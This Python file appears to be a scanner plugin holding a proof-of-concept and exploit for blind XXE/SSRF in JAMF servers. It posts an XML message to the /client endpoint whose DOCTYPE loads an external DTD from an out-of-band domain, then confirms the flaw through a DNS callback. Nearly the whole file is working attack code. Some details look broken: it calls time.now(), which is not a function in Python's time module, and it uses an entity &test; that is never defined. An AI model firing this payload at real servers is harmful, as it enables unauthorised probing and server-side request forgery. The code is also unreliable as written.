import requests
import time
from plugins.oob import verify_request, gen_oob_domain



# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''JAMF Blind XXE / SSRF''',
        "description": '''''',
        "severity": "medium",
        "references": [
            "https://www.synack.com/blog/a-deep-dive-into-xxe-injection/"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["xxe", "ssrf", "jamf"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        oob_domain,flag = gen_oob_domain()
        unix_time = time.now()

        path = """/client"""
        method = "POST"
        data = """<?xml version='1.0' encoding='UTF-8' standalone="no"?>
<!DOCTYPE jamfMessage SYSTEM "http://{oob_domain}/test.xml">
<ns2:jamfMessage xmlns:ns3="http://www.jamfsoftware.com/JAMFCommunicationSettings" xmlns:ns2="http://www.jamfsoftware.com/JAMFMessage">
  <device>
    <uuid>&test;</uuid>
    <macAddresses />
  </device>
  <application>com.jamfsoftware.jamfdistributionserver</application>
  <messageTimestamp>{unix_time}</messageTimestamp>
  <content xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="ns2:ResponseContent">
    <uuid>00000000-0000-0000-0000-000000000000</uuid>
    <commandType>com.jamfsoftware.jamf.distributionserverinventoryrequest</commandType>
    <status>
      <code>1999</code>
      <timestamp>{unix_time}</timestamp>
    </status>
    <commandData>
      <distributionServerInventory>
        <ns2:distributionServerID>34</ns2:distributionServerID>
      </distributionServerInventory>
    </commandData>
  </content>
</ns2:jamfMessage>""".format(oob_domain=oob_domain, unix_time=unix_time)
        headers = {'Content-Type': 'application/xml'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if verify_request(type="dns", flag=flag):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url